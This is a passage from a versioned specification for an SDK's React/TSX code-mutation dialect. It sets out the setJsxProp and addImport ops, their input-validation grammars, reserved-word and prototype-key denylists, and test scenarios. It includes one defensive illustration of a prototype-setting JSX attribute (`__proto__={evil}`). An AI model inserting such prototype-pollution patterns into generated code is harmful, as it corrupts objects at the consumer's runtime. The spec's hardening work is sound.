# React (TSX/JSX) Dialect Specification

**Spec version**: V6
**Status**: signed (owner, 2026-07-17)
**Change**: `react-dialect`

(V6: verify-final iteration-2 F-1 closure, 2026-07-17 — owner-decided surgical amendment, no
scope re-open. `sdd-verify --mode=final` iteration 2 (`verify-report.md`) ruled V5's
`addImport.name` denylist SPEC-CONFORMANT (46/46, zero drift) but surfaced a residual hole in
the requirement's own FLOOR: `eval` and `arguments` pass validation and emit `import { eval }
from "react";` / `import { arguments } from "react";`, which node's real ES module parser
rejects (`SyntaxError: Unexpected eval or arguments in strict mode`) — the same defect CLASS as
SEC-1 (grammar admits `IdentifierName`, not `BindingIdentifier`), narrowed to two identifiers
V5's reserved-word set legitimately could not contain: `eval`/`arguments` are
strict-mode-RESTRICTED BindingIdentifier names, not reserved words, so a reserved-word set —
however exhaustive over ECMAScript keywords — is the wrong category to catch them. REQ-RXD-06
now: (1) adds both to `IMPORT_RESERVED_WORDS`, 46 → 48; (2) retires the "at minimum" floor
language for this set — the verifier's brute-force sweep proves 48/48 is COMPLETE for the
BindingIdentifier-in-strict-ES-module problem this argument validates, so the requirement now
states completeness instead of a lower bound; (3) adds Scenario REQ-RXD-06.9 pinning
`eval`/`arguments` rejection with a substring-acceptance counter-check, matching REQ-RXD-06.7's
shape. Nothing else in this spec changes — REQ-RXD-05, REQ-RXD-15, and all other REQs are
untouched; `council-findings.md`'s CLOSED items and the archive commitments (DOC-3, ARCH-2,
subprocess-timeout debt) stay exactly as recorded.)

(V5: owner-routed council fix pass, 2026-07-17 — spec-first per explicit owner ruling
("patching code against a signed spec that states falsehoods re-opens on the next drift
check"). Four blind Council personas (architect, qa-engineer, security-engineer, tech-writer)
found four real `addImport` correctness bugs plus two spec defects that
`sdd-verify --mode=final` missed; full record in `council-findings.md`. FOUR changes, all
correcting or completing existing contracts — no scope expansion. (1) REQ-RXD-06:
`addImport.name`'s grammar admitted JS reserved words while its own error text promised "a
valid JavaScript identifier" — `addImport("default", "react")` emitted invalid TSX that
`print()` never re-validates (SEC-1). A new frozen `IMPORT_RESERVED_WORDS` denylist (46
ECMAScript keywords + strict-mode-reserved words + `await` — ES modules are always strict)
closes the gap; the rule label now names the reserved-word exclusion so spec and message
agree. (2) REQ-RXD-06: the claim that `{__proto__, constructor, prototype}` is "the full
prototype-walk set" is REMOVED — factually false (`__defineGetter__`, `valueOf`,
`hasOwnProperty`, etc. all pass and are harmless). The wording now states the REAL, narrower
load-bearing property of `__proto__` in `propName` position (it prevents an author's generated
JSX from setting a prototype at the CONSUMER's runtime via transpilation, not an SDK-memory
concern) and names Set-key-safety — not denylist width — as the actual defence against
SDK-internal pollution (SEC-2; new scenario REQ-RXD-06.8 pins it). `constructor`/`prototype`
stay denylisted (unchanged behaviour, not this change's call to narrow) but are now honestly
described as defense-in-depth. (3) REQ-RXD-05: the merge-or-create contract is made PRECISE
for non-named-import declaration shapes it previously left unstated — type-only clauses,
default-only imports, namespace imports, and aliased named imports each now have an explicit,
testable rule (six new scenarios, REQ-RXD-05.5–.10), closing four real correctness bugs the
Council found: silently merging into a type-only clause (runtime-unbound identifier),
producing a duplicate-binding TS error against a same-name default import, a hard throw
against a namespace import, and a silent no-op against an aliased named import. (4)
REQ-RXD-11.5's literal example is amended from an unterminated `'{'` (unimplementable under
ADR-03 — ts-morph's reparse-and-reconcile throws before `print()` runs) to a
delimiter-balanced `'{1+}'`, which correctly demonstrates the no-semantic-revalidation
contract; a NEW adjacent scenario (REQ-RXD-11.6) pins that a genuinely unterminated value
fails SAFELY (contained, zero directives, byte-unchanged) rather than corrupting output. ALSO
NEW: REQ-RXD-15 — the authoring doc's "For contributors" section never taught the
`validatedOp` pattern this change introduces, so a third dialect could ship unvalidated ops
reproducing the exact vulnerability class ADR-05 calls "confirmed" and "not repeated" (ARCH-1);
this closes that documentation gap. NOT in this version, by explicit ruling: ARCH-2 (validator
module placement — already routed to archive commitments, out of this change's scope); DOC-3
(`could not parse "X" as TypeScript` in the dialect-generic `src/core/dialect-handle.ts:178`)
— ruled a PENDING-CHANGE, not spec'd here: that file is explicitly Read-only/zero-change in
this change's signed design §4.2, and a correct fix requires threading a per-dialect display
name through the generic `dialect-handle`/`define-dialect` seam shared by EVERY dialect —
exactly the "any change to the engine" this change's triage scope excludes. All V5 fixes are
implementable inside the already-shipped `src/dialects/react/**` + `src/core/jsx-name-
validator.ts` files this change owns.)

(V4: owner-dictated micro-amendment #2, unfreeze micro-cycle 2026-07-16 — signed status
RETAINED, owner rulings applied verbatim. TWO changes. (1) REQ-RXD-02: V3's
extensionless-basename normalization is REVERTED — an extensionless basename now REJECTS.
Owner's forward-compatibility ruling: `.jsx` support is a registered pending-changes row; when
it lands, an extensionless path would be AMBIGUOUS between `Button.tsx` and `Button.jsx`, and a
baked-in `.tsx` assumption would be a breaking surface change to unwind. Scenario IDs
REQ-RXD-02.6 and REQ-RXD-02.7 (minted V3 for the normalize + directory-dots-normalize cases)
are RETIRED at V4 — never consumed by any downstream artefact, never to be reused;
REQ-RXD-02.8 (dotfile/trailing-dot rejects) is KEPT — that behaviour is unchanged — with its
rationale wording updated to drop the normalization reference. New scenarios REQ-RXD-02.9/.10
pin the extensionless reject. REQ-RXD-09's V3 convenience docs criterion and scenario
REQ-RXD-09.5 are REPLACED in place with the explicit-extension requirement documentation.
(2) REQ-RXD-06: the reserved-name denylist widens from `{__proto__}` to `{__proto__,
constructor, prototype}` — the full prototype-walk set — for BOTH `elementName` and `propName`
(security council rec, owner-approved; verified no signed ACCEPT scenario needs
`constructor`/`prototype`). The denylist is a frozen `Set` checked via `.has()` equality —
never an object literal, never regex-encoded. REQ-RXD-06.5's hostile battery gains both names.
Nothing else moved; the local-consumption delta is untouched.)

(V3 — superseded by V4's change 1: owner-dictated extensionless-basename normalization
(`find("src/Button")` ≡ `find("src/Button.tsx")`, observable on directives; scenarios
REQ-RXD-02.6/.7/.8, docs criterion REQ-RXD-09.5). The V3 rationale — authors shouldn't pay
ceremony for the only supported extension — was reconsidered against `.jsx`
forward-compatibility and reversed.)

(V2: council synthesis incorporated — qa-engineer + security-engineer + business-analyst.
Headline changes: the single-regex validator is replaced by THREE per-argument grammars
(REQ-RXD-06, security-verified against ts-morph's own `.d.ts` — `JsxAttributeStructure.name`
and initializers are written as RAW TEXT, so the validator is load-bearing, not
belt-and-suspenders); the `value` trust boundary is promoted to a first-class requirement
(REQ-RXD-12); `setJsxProp` gains a deterministic match-count trio (REQ-RXD-04), a placement/
whitespace contract (REQ-RXD-10), and a value grammar (REQ-RXD-11); rejection-surface hygiene
(no-echo tails, zero-emit + byte-unchanged on every reject) is REQ-RXD-13; the spike-dependency
supply-chain gate is REQ-RXD-14; the extension gate's timing is pinned synchronous-at-`find()`
(REQ-RXD-02); the conformance corpus mix is re-specified with TSX-mode-engagement proof
(REQ-RXD-03/08). All V1 REQ-IDs preserved; new requirements are REQ-RXD-10..14.)

## Purpose

Schematic authors who need to mutate `.tsx`/JSX files have no dialect that supports that syntax
today — `ts.find("Component.tsx")` reaches the shipped TypeScript dialect's `.ts`-only parser
and throws. This capability ships a second dialect, `@pbuilder/sdk/react`, mirroring the proven
TypeScript dialect's shape (parse/print pair, `find()` entry, op-pack composition) with a
deliberately minimal v1 op pair — `setJsxProp` + `addImport` — that proves JSX-structural
mutation end to end without committing to a full React mutation catalog.

## Requirements

### REQ-RXD-01: Frozen subpath + exact 2-op vocabulary

The React dialect MUST be reachable at the exact subpath `@pbuilder/sdk/react`. Its op-pack
MUST expose `.modify(fn)` (universal escape hatch, `dialect-generics` REQ-DG-03) plus EXACTLY
TWO structured ops: `setJsxProp(elementName: string, propName: string, value?: string)` and
`addImport(name: string, from: string)`. No third op ships in v1 — the exact set is an
anti-smuggle assertion, not an allow-list a contributor can quietly extend.

(Previously: `setJsxProp`'s `value` was typed required `value: string`. V2 makes it optional —
an omitted `value` produces the boolean-shorthand attribute form, REQ-RXD-11.)

#### Scenario REQ-RXD-01.1: subpath resolves, exact op-set shape

- GIVEN `package.json#exports`
- WHEN `@pbuilder/sdk/react` is imported and `Object.keys(dialect.ops)` is sorted
- THEN it resolves AND the sorted array EQUALS EXACTLY `["addImport", "setJsxProp"]` —
  asserted via `toEqual`, never `toContain`/subset, so an extra op fails RED

### REQ-RXD-02: Extension gate — `.tsx`-only, synchronous at `find()`, fail-closed

`find(path)` MUST classify `path` SYNCHRONOUSLY, at the `find()` call itself — before any op is
chained, before any parse is attempted, before any run flush — by its BASENAME:

- **Basename with suffix `.tsx` → pass**.
- **Extensionless basename → reject (V4)**: when the basename of `path` contains no `.` at
  all, `find()` MUST reject via `dialectError` — the React dialect REQUIRES an explicit `.tsx`
  extension. The tail names the rule and the fix, e.g.: `find(path) — the React dialect
  requires an explicit .tsx extension; received a path with no extension. Append .tsx to the
  path.` RATIONALE (in-contract, not incidental): the extension must be explicit because
  future `.jsx` support (a registered pending-changes row) would make an ASSUMED extension
  ambiguous between `Button.tsx` and `Button.jsx` — an implicit `.tsx` default would then be a
  breaking surface change to unwind. Dots in DIRECTORY segments do not make an extension —
  `find("src/v1.2/Button")` has an extensionless basename and rejects the same way.
- **Basename with a dot, suffix not `.tsx` → reject** via `dialectError`, V2 behaviour
  unchanged. The rejection message MUST name the fix: for `.ts`, it MUST point the author at
  `@pbuilder/sdk/typescript`; for `.jsx`, it MUST state v1 does not support `.jsx` and
  reference the React op-catalog follow-up; for any other suffix, it MUST state `.tsx` is the
  only supported extension. Deterministic edges resolve by the same suffix rule: a dotfile
  (`find(".babelrc")`) has suffix `babelrc` → reject with the "only `.tsx`" tail; a
  trailing-dot basename (`find("Button.")`) has an EMPTY suffix → reject. Error tails are
  UNCHANGED from V2 for all pre-existing reject classes.

(Timing ruled, V2: the handle factory constructs synchronously and touches no run context until
an op enqueues, so the earliest deterministic gate point is the `find()` call; a
deferred-to-flush mutant dies against this pin. The extensionless reject carries the SAME
timing pin.) The message MAY echo the offending path (bounded — paths are not payloads;
contrast REQ-RXD-13's value no-echo rule). This gate is NEW behaviour relative to the
TypeScript dialect's `find()` (which performs no extension check today) — deliberately
introduced here since a wrong-extension file previously reached the parser and threw an
unhelpful raw error.

(Previously: V2 rejected every non-`.tsx` path, extensionless ones falling into the
"other extension" class without a dedicated rule or scenario. V3 briefly made an extensionless
basename NORMALIZE to `.tsx` (owner DX ruling); V4 REVERTS that to an explicit, dedicated
reject with the forward-compatibility rationale above — scenario IDs REQ-RXD-02.6/.7 (V3's
normalize + directory-dots-normalize) are retired, never consumed, never to be reused. V1→V2
history: V1 required the gate "BEFORE attempting to parse" but left WHEN unpinned; V2 pinned
synchronous-at-`find()` with a timing scenario and added the bounded-path-echo allowance.)

#### Scenario REQ-RXD-02.1: `.ts` path rejected, names the fix

- GIVEN a path ending in `.ts`
- WHEN `find(path)` is called
- THEN it throws a `dialectError` whose message names `@pbuilder/sdk/typescript` as the fix

#### Scenario REQ-RXD-02.2: `.jsx` path rejected, names the follow-up

- GIVEN a path ending in `.jsx`
- WHEN `find(path)` is called
- THEN it throws a `dialectError` stating `.jsx` is unsupported in v1 and naming the React
  op-catalog follow-up as where it is tracked

#### Scenario REQ-RXD-02.3: other extension rejected, generic message

- GIVEN a path ending in an extension that is neither `.tsx`, `.ts`, nor `.jsx` (e.g. `.md`)
- WHEN `find(path)` is called
- THEN it throws a `dialectError` stating `.tsx` is the only supported extension

#### Scenario REQ-RXD-02.4: `.tsx` path proceeds past the gate

- GIVEN a path ending in `.tsx`
- WHEN `find(path)` is called and an op runs
- THEN no extension-gate rejection occurs — the handle proceeds to parse

#### Scenario REQ-RXD-02.5: gate timing is synchronous — the `find()` call itself throws (NEW, V2)

- GIVEN a path ending in `.ts`
- WHEN `find(path)` is invoked bare, with NO op chained and NO run flush
- THEN the `find()` call itself throws synchronously (`expect(() => find("a.ts")).toThrow`) —
  a gate deferred to first-op resolution or to flush FAILS this scenario

(Scenario IDs REQ-RXD-02.6 and REQ-RXD-02.7 — minted at V3 for the extensionless-normalize and
directory-dots-normalize cases — are RETIRED at V4: never consumed by any downstream artefact,
never to be reused for different behaviour.)

#### Scenario REQ-RXD-02.8: dotfile and trailing-dot basenames reject via the suffix rule (V3; wording updated V4)

- GIVEN `find(".babelrc")` and `find("Button.")`
- WHEN each is called
- THEN each throws a `dialectError` synchronously with the existing "only `.tsx`" reject tail —
  `.babelrc`'s suffix is `babelrc`, `Button.`'s suffix is empty; both basenames CONTAIN a dot,
  so both resolve through the non-`.tsx`-suffix rule, not the extensionless rule

#### Scenario REQ-RXD-02.9: extensionless basename rejects, tail names the explicit-`.tsx` requirement (NEW, V4)

- GIVEN `find("src/Button")` — a basename containing no `.`
- WHEN `find()` is called
- THEN it throws a `dialectError` synchronously whose tail states the React dialect requires an
  explicit `.tsx` extension and tells the author to append `.tsx` — no normalization, no
  deferred rejection

#### Scenario REQ-RXD-02.10: directory dots don't make an extension — same reject (NEW, V4)

- GIVEN `find("src/v1.2/Button")` — a dotted DIRECTORY segment, extensionless basename
- WHEN `find()` is called
- THEN it throws the SAME explicit-`.tsx`-requirement `dialectError` as REQ-RXD-02.9 — the
  `v1.2` directory dot does not count as an extension

### REQ-RXD-03: ts-morph `ScriptKind.Tsx` parse/print fidelity — mode engagement proven

The React dialect's `ast.parse`/`ast.print` pair MUST use ts-morph with a virtual `.tsx` path
(`ScriptKind.Tsx`), reusing the byte-exact `getFullText()` mechanism, BOM re-prepend, and
content-derived `detectNewLineKind` the TypeScript dialect's `ast.ts` already proves
(owner-ratified AST library decision) — never a host-OS-derived setting, never a different AST
library. Round-trip fidelity (`print(parse(source)) === source`) MUST be byte-exact for both
plain-TSX and JSX-bearing content, including BOM and CRLF preservation. TSX MODE ENGAGEMENT
MUST be proven by parse-divergence, not assumed: source that parses DIFFERENTLY under
`ScriptKind.Tsx` than under plain `.ts` semantics is the only evidence the flag is live.

(Previously: V1 asserted round-trip fidelity only. V2 adds the mode-engagement divergence proof
— council's highest-value coverage gap: nothing in V1 proved `ScriptKind.Tsx` was actually
engaged rather than silently falling back to `.ts` parsing.)

#### Scenario REQ-RXD-03.1: JSX round-trip byte-exact

- GIVEN a `.tsx` sample containing fragments, self-closing tags, and expression containers
- WHEN parsed and printed with no edit
- THEN the output is byte-exact against the original

#### Scenario REQ-RXD-03.2: BOM+JSX preserved

- GIVEN a seeded `.tsx` file with a UTF-8 BOM and JSX content
- WHEN round-tripped with no edit
- THEN the BOM is preserved byte-exact

#### Scenario REQ-RXD-03.3: CRLF+JSX preserved

- GIVEN a seeded `.tsx` file with CRLF line endings and JSX content
- WHEN round-tripped with no edit
- THEN CRLF line endings are preserved byte-exact

#### Scenario REQ-RXD-03.4: TSX-only generic-arrow syntax round-trips (NEW, V2)

- GIVEN the sample `const id = <T,>(a: T) => a;` — the trailing-comma generic arrow form TSX
  requires for disambiguation
- WHEN parsed and printed with no edit
- THEN it round-trips byte-exact — the parse succeeds under TSX semantics

#### Scenario REQ-RXD-03.5: angle-bracket cast REJECTS — divergence proves Tsx mode engaged (NEW, V2)

- GIVEN the sample `const x = <string>y;` — a legal angle-bracket CAST under `.ts` semantics,
  but an unclosed JSX element (syntax error) under `ScriptKind.Tsx`
- WHEN `parse` runs on it
- THEN it FAILS as a parse rejection (contained per `dialect-generics` REQ-DG-05.2's contract)
  — the SAME source parses cleanly through the TypeScript dialect's `parse`, and that
  divergence is the proof `ScriptKind.Tsx` is live, not silently defaulted

### REQ-RXD-04: `setJsxProp` — deterministic targeting + upsert

`setJsxProp(elementName, propName, value?)` MUST resolve its target by counting elements whose
opening (or self-closing) tag name matches `elementName` (a LOOKUP against the tag-name node's
text — see REQ-RXD-06 for the lookup-only property): ZERO matches → reject via `dialectError`
naming the missing element and suggesting `.modify()`; EXACTLY ONE match → mutate it; MORE THAN
ONE match → reject via `dialectError` naming the element AND the match COUNT and pointing at
`.modify()` for disambiguation. Never silent-first-match — targeting is deterministic or it is
a loud reject. On the single match: update `propName`'s value if the attribute already exists
on its attribute list (upsert), or INSERT a new attribute if absent — never an
append-duplicate. The op MUST leave every other region of the file byte-stable (single-op
fidelity, mirrors `dialect-conformance` REQ-DC-02).

(Previously: V1 said "the FIRST JsxOpeningElement matching" — silent-first-match. V2 replaces
that with the reject-on-ambiguous match-count trio per 3-lens council convergence; orchestrator
flags this ruling to the owner at sign time.)

#### Scenario REQ-RXD-04.1: exactly one match — insert new prop

- GIVEN a `.tsx` file containing exactly ONE `<Button />` with no `onClick` attribute
- WHEN `setJsxProp("Button", "onClick", "{handleClick}")` is applied
- THEN the printed output shows the `onClick` attribute inserted, and every other region of
  the file is byte-identical to the original

#### Scenario REQ-RXD-04.2: update existing prop (upsert, no duplicate)

- GIVEN a `.tsx` file containing `<Button onClick={oldHandler} />`
- WHEN `setJsxProp("Button", "onClick", "{newHandler}")` is applied
- THEN the printed output replaces the attribute's value with `{newHandler}`, with no
  duplicate `onClick` attribute on the element

#### Scenario REQ-RXD-04.3: unchanged-elsewhere

- GIVEN a multi-element `.tsx` sample and `setJsxProp` applied to the ONE matching element
- WHEN the printed output is diffed against the original
- THEN only the targeted attribute's region differs; every other line is byte-identical

#### Scenario REQ-RXD-04.4: zero matches — loud reject naming the element (NEW, V2)

- GIVEN a `.tsx` file containing no element named `Missing`
- WHEN `setJsxProp("Missing", "x", "{1}")` is applied
- THEN it rejects via `dialectError` naming `Missing` as not found and suggesting `.modify()`,
  with zero directives emitted and the file byte-unchanged (REQ-RXD-13)

#### Scenario REQ-RXD-04.5: two matches — deterministic reject naming element and count (NEW, V2)

- GIVEN a `.tsx` file containing TWO `<Button />` elements
- WHEN `setJsxProp("Button", "onClick", "{f}")` is applied
- THEN it rejects via `dialectError` naming `Button` AND the count (2) and pointing at
  `.modify()` — never a silent mutation of the first match; zero directives, file byte-unchanged

#### Scenario REQ-RXD-04.6: member-expression element name targets `<Menu.Item />` (NEW, V2)

- GIVEN a `.tsx` file containing exactly one `<Menu.Item />`
- WHEN `setJsxProp("Menu.Item", "disabled")` is applied
- THEN the attribute is inserted on that element (boolean shorthand, REQ-RXD-11), byte-exact
  against a committed golden

### REQ-RXD-05: `addImport` — merge-or-create, idempotent, named-only, shape-aware (V5: precise contract for non-named declaration shapes)

`addImport(name, from)` MUST guarantee that `name` is bound in the file's module scope as a
named import from `from`, using ONLY the named form `import { name } from "from"` for any
specifier IT creates, and MUST NEVER produce an invalid or duplicate binding. Define a
specifier's LOCAL NAME as the identifier it actually binds in scope: for a named-import
specifier, its alias if one exists, else its own name; for a default specifier, the default
local name; for a namespace specifier, the namespace local name. The algorithm, applied in
order:

1. **Already-bound check (idempotency, generalized across shapes)**: if `name` already equals
   the LOCAL NAME of ANY existing import specifier from the SAME module `from` — regardless of
   whether that specifier is a plain named import, an ALIASED named import, a DEFAULT import,
   or a NAMESPACE import — `addImport` is a no-op. Creating a new specifier here would either
   duplicate an existing binding or produce an invalid re-declaration.
2. **Merge**: otherwise, if an EXISTING declaration for `from` has a named-import clause (a
   `NamedImports` node, whether or not it already carries other specifiers) AND is NOT
   type-only, add a NEW, UNALIASED named specifier `name` to that clause.
3. **Create**: otherwise — no declaration for `from` has a matching named-import clause (covers:
   no import from `from` exists at all; every existing declaration for `from` is type-only;
   every existing declaration for `from` is default-only with no named clause; every existing
   declaration for `from` is namespace-only) — INSERT a FRESH, SEPARATE declaration
   `import { name } from "from";`, coexisting with any pre-existing declarations for the same
   module. `addImport` NEVER mutates a type-only, default-only, or namespace-only declaration's
   clause structure to graft named bindings onto it — TS/JS syntax forbids some combinations
   (e.g. a namespace specifier cannot coexist with a named clause on one declaration), and
   doing so blind risks a manipulation-time failure or a semantically wrong edit.

The op remains NAMED-BINDING-ONLY, pinned as contract: any specifier it creates always uses the
named form — default and namespace imports are NOT forms `addImport` itself synthesizes in v1
(a documented limitation; the React op-catalog follow-up is their home, REQ-RXD-09).

(Previously: V1's requirement text cited `typescript-dialect` REQ-TSD-01.2/REQ-TSD-03.10 as the
normative source of the merge and idempotency rules. V2 makes this contract self-contained —
the rules are stated here in full; no cross-domain REQ-ID is load-bearing. V2 also adds the
named-only pin and its scenario. V5: the merge target and idempotency check were previously
stated informally ("an EXISTING named-import clause... if one already exists") and the
shipped implementation matched ANY declaration by module specifier regardless of its FORM — a
real gap producing four correctness bugs the Council found: merging into a type-only clause
silently erases the import at compile time; a same-name default import collides into a
duplicate-binding TS error; a namespace import hard-throws; an aliased named import silently
no-ops while leaving the requested identifier unbound. V5 makes the algorithm explicit and
shape-aware via a "local name"-based idempotency check and a merge target scoped strictly to
non-type-only named-import clauses; scenarios 05.1–05.4 are UNCHANGED in expected outcome under
the new algorithm — they are the already-correct baseline cases.)

#### Scenario REQ-RXD-05.1: fresh import inserted

- GIVEN a `.tsx` file with no import from the target module
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output contains `import { useState } from "react";` inserted, byte-exact
  against a committed golden fixture

#### Scenario REQ-RXD-05.2: merges into an existing clause

- GIVEN a `.tsx` file with an existing `import { useEffect } from "react";`
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output merges to a single clause naming both `useEffect` and `useState`

#### Scenario REQ-RXD-05.3: duplicate call idempotent

- GIVEN `find(path).addImport(x, m).addImport(x, m)` — the SAME name+module called twice
- WHEN flushed
- THEN the printed content contains a SINGLE valid import statement for `{x} from m` — no
  duplicate import lines

#### Scenario REQ-RXD-05.4: named-only form pinned — no default-import synthesis (NEW, V2)

- GIVEN a `.tsx` file and `addImport("React", "react")`
- WHEN flushed
- THEN the printed output contains the NAMED form `import { React } from "react";` — NOT
  `import React from "react"` — pinning that v1 never synthesizes default/mixed imports

#### Scenario REQ-RXD-05.5: type-only clause is never a merge target — separate value import inserted (NEW, V5)

- GIVEN a `.tsx` file with `import type { FC } from "react";` and no value import from `react`
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output KEEPS `import type { FC } from "react";` unchanged AND adds a
  SEPARATE `import { useState } from "react";` declaration — `useState` is bound at runtime,
  never merged into the type-only clause

#### Scenario REQ-RXD-05.6: default import, same local name — idempotent no-op (NEW, V5)

- GIVEN a `.tsx` file with `import React from "react";`
- WHEN `addImport("React", "react")` is applied
- THEN the printed output is BYTE-IDENTICAL to the input — no `{ React }` clause is added, no
  duplicate `React` binding is created

#### Scenario REQ-RXD-05.7: default import, different name — separate declaration inserted (NEW, V5)

- GIVEN a `.tsx` file with `import React from "react";`
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output KEEPS `import React from "react";` unchanged AND adds a SEPARATE
  `import { useState } from "react";` declaration

#### Scenario REQ-RXD-05.8: namespace import, different name — separate declaration inserted (NEW, V5)

- GIVEN a `.tsx` file with `import * as React from "react";`
- WHEN `addImport("useState", "react")` is applied
- THEN it SUCCEEDS (no throw) — the printed output KEEPS the namespace import unchanged AND
  adds a SEPARATE `import { useState } from "react";` declaration

#### Scenario REQ-RXD-05.9: namespace import, same local name — idempotent no-op (NEW, V5)

- GIVEN a `.tsx` file with `import * as React from "react";`
- WHEN `addImport("React", "react")` is applied
- THEN the printed output is BYTE-IDENTICAL to the input — `React` is already bound as the
  namespace local name; no new declaration or clause is added

#### Scenario REQ-RXD-05.10: aliased named import — merge adds a second, unaliased specifier (NEW, V5)

- GIVEN a `.tsx` file with `import { useState as us } from "react";`
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output is `import { useState as us, useState } from "react";` — the
  pre-existing alias `us` is undisturbed, AND `useState` is now ALSO bound as its own bare
  identifier (the existing named clause is a valid merge target; `us`'s local name did not
  already equal the requested `useState`)

### REQ-RXD-06: Per-argument name validation at the op boundary (security — load-bearing)

Validation is PER-ARGUMENT with THREE distinct grammars — a single shared identifier regex is
wrong for JSX and is explicitly rejected by this requirement:

- **`addImport.name`** MUST match `^[A-Za-z_$][A-Za-z0-9_$]*$` (JS import bindings are plain
  identifiers) AND MUST NOT be one of the reserved words or strict-mode-restricted identifiers
  listed below — the regex alone admits `IdentifierName`, not `BindingIdentifier`, and
  `import { name }` requires a valid BindingIdentifier in binding position. The frozen set
  `IMPORT_RESERVED_WORDS` (checked via `.has()` equality, same mechanism as
  `JSX_NAME_DENYLIST`, never regex-encoded) MUST contain EXACTLY these 48 entries: the
  always-reserved ECMAScript keywords (`break case catch class const continue debugger default
  delete do else enum export extends false finally for function if import in instanceof new
  null return super switch this throw true try typeof var void while with`) PLUS the
  strict-mode-reserved words (`implements interface let package private protected public
  static yield`) PLUS `await` PLUS the strict-mode-RESTRICTED BindingIdentifier names `eval`
  and `arguments` (V6 — closes F-1). The last two are a DIFFERENT grammar category from the
  other 46: `eval` and `arguments` are not reserved words — both remain valid identifiers
  outside binding position, and as binding names in non-strict code — a strict-mode early-error
  rule alone forbids them as a `BindingIdentifier`. That is exactly why a reserved-word set,
  however exhaustively it covers ECMAScript keywords, does not and cannot contain them by
  construction: a real gap in this requirement's floor, not an oversight in the code that
  implemented it (the shipped set matched the V5 spec exactly, 46/46, zero drift). Because
  `addImport` always emits into an ES module, and ES modules are ALWAYS strict, BOTH categories
  — reserved words AND strict-mode-restricted BindingIdentifiers — apply unconditionally here,
  and their union is the complete set of identifier strings ECMA-262 can reject in
  BindingIdentifier position. This set is therefore COMPLETE for the problem `addImport.name`
  validates, not a floor: `IMPORT_RESERVED_WORDS` MUST NOT be read as "at minimum" going
  forward. No alias handling — neither v1 op takes an `as`-alias argument. NOTE: the shipped
  TypeScript dialect's `addImport` performs NO name validation today (a confirmed vulnerability
  class); the React dialect's MUST, from day one.
- **`setJsxProp.propName`** MUST match `^[A-Za-z_][A-Za-z0-9_-]*(:[A-Za-z_][A-Za-z0-9_-]*)?$`
  — hyphens and ONE colon segment admitted, so `data-testid`, `aria-label`, and `xlink:href`
  (the most common real-world attribute classes) are accepted. The widening is injection-safe:
  neither `-` nor `:` can terminate the attribute-name token. ADDITIONALLY, the reserved-name
  DENYLIST `{__proto__, constructor, prototype}` (V4 widening; V2/V3 listed `__proto__` only)
  MUST be rejected despite all three matching the grammar. This denylist is DEFENSE-IN-DEPTH,
  not the primary defence, and its members are NOT equally load-bearing: `__proto__` in
  `propName` position IS genuinely load-bearing — it prevents an author's `setJsxProp` call
  from producing GENERATED CODE that sets an object's prototype at the CONSUMER'S runtime via
  JSX transpilation (`<div __proto__={evil} />` compiles to `_jsx("div", { __proto__: evil })`,
  and a literal `__proto__` key in that object literal DOES set the prototype — a property of
  the author's OUTPUT, not of SDK-internal memory). `constructor` and `prototype` in that same
  position are plain OWN properties of the generated object literal (no prototype-setting
  effect) — they remain denylisted per an explicit security-council recommendation (the V4
  widening from `{__proto__}` alone) as defense-in-depth, not because removing them would
  reopen a proven exploit. The PRIMARY defence against prototype pollution of SDK-INTERNAL
  state (as opposed to the author's generated-code output above) is Set-key-safety
  (REQ-RXD-06.8): `propName` and `elementName` are NEVER used as a plain-object key anywhere in
  the validator or the ops implementation — targeting and validation use `===`/`Set`/`Map`
  equality only, never `obj[name]`, `{[name]: …}`, or `counts[tag]++`. This property, not
  denylist width, is why names like `__defineGetter__`, `valueOf`, `toString`, and
  `hasOwnProperty` — none of which are denylisted, all of which pass the grammar — are harmless
  if supplied as `propName` or `elementName`: nothing in this dialect ever indexes an object
  with them.
- **`setJsxProp.elementName`** MUST match a member/namespaced/hyphenated JSX-name grammar
  (accepting `Button`, `Menu.Item`, `my-web-component`), and the SAME reserved-name denylist
  `{__proto__, constructor, prototype}` MUST be rejected — input-hygiene consistency with
  `propName`, not an injection gate: `elementName` is LOOKUP-ONLY, compared against each
  element's tag-name text via `===`, NEVER spliced into source. The spec states this property
  explicitly so the trust analysis stays honest: `propName` is the spliced, validator-protected
  channel; `elementName` is not spliced at all, and its denylist membership serves consistency
  and Set-key-safety (above), not a splice-injection defence.
- **`addImport.from`** has NO allow-list — legitimate module specifiers contain `@ / . :` and
  more. Safety rests on ts-morph string-literal-escaping the `moduleSpecifier` field; that
  assumption is PINNED by the regression scenario REQ-RXD-06.4, not assumed silently.

A failing value MUST reject via `dialectError` BEFORE the AST is touched, with zero directives
emitted and the target file byte-unchanged (REQ-RXD-13). The validator is LOAD-BEARING, not
belt-and-suspenders: ts-morph writes `JsxAttributeStructure.name` and attribute initializers as
RAW TEXT with no escaping (verified against ts-morph's `.d.ts` — `JsxAttributeStructure`'s
name/initializer fields and `setInitializer(text)`), so `propName` safety comes from this
validator ALONE.

(Previously: V1 mandated one shared pattern `^[A-Za-z_$][A-Za-z0-9_$]*$` for elementName,
propName, AND addImport.name, with both-sides-of-`as` alias checking, and implied `from` safety
came from ts-morph's "structured API". V2: three per-argument grammars; alias language dropped
(no v1 op takes an alias); the structured-API-safety implication corrected to a pinned escaping
assumption; `__proto__` denylist added; elementName's lookup-only property stated. V5 (council
SEC-1/SEC-2): (a) `addImport.name`'s grammar admitted JS reserved words while its own error
text promised "a valid JavaScript identifier" — `addImport("default", "react")` emitted
invalid TSX, never re-validated at print time; a frozen `IMPORT_RESERVED_WORDS` denylist closes
the gap and the rule label now names the reserved-word exclusion so spec and message agree. (b)
the "full prototype-walk set" claim about `{__proto__, constructor, prototype}` is REMOVED — it
was factually false (many prototype-walk methods pass the grammar and are harmless); the
wording now states the REAL, narrower load-bearing property of `__proto__` in `propName`
position (consumer generated-code prototype-setting, not SDK memory) and names Set-key-safety,
not denylist width, as the actual defence against SDK-internal pollution — correcting the spec
to match what the shipped code comment already said correctly. `constructor`/`prototype` stay
denylisted (unchanged behaviour) but are now honestly described as defense-in-depth. V6 (F-1,
verify-final iteration 2): `IMPORT_RESERVED_WORDS` widens from 46 to 48 — `eval` and `arguments`
added. These are strict-mode-restricted BindingIdentifier names, not reserved words, which is
why V5's reserved-word enumeration legitimately did not catch them: a reserved-word set is the
